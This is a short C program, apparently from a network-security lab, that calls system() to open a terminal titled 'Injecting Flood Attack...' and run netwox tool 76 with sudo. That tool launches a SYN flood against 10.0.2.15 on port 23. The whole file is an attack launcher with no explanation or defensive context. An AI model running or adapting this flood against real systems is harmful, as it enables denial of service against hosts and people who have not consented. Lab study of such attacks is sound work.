#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
//#include <sys/wait.h>

int main () {

   char command[100];
   strcpy(command, "gnome-terminal --title='Injecting Flood Attack...' -e 'sudo netwox 76 -i 10.0.2.15 -p 23 -s raw'");
   system(command);

   return 0;

}
